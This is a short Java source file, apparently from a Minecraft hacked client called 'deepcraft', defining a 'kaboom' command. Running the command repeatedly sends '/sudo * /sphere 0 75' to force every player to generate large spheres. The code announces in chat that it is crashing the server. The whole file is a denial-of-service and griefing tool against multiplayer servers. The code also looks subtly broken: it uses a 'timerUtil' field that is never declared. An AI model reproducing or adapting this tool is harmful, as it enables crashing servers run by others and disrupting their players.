package me.deepcraft.commands.list;

import me.deepcraft.commands.Command;
import me.deepcraft.utils.ChatUtil;
import me.deepcraft.utils.TimerUtil;

public class KaboomCommand extends Command {

    public KaboomCommand() {
        super("kaboom");
    }

    @Override
    public void execute(String[] args) {
        ChatUtil.clientMessage("§aCrashing");
        for (int x = 1; x <= 1000; x++) {
            timerUtil.delay(1000);
            if(timerUtil.hasReached(1000)) {
                ChatUtil.publicMessage("/sudo * /sphere 0 75");
                timerUtil.reset();
            }
        }

    }
}
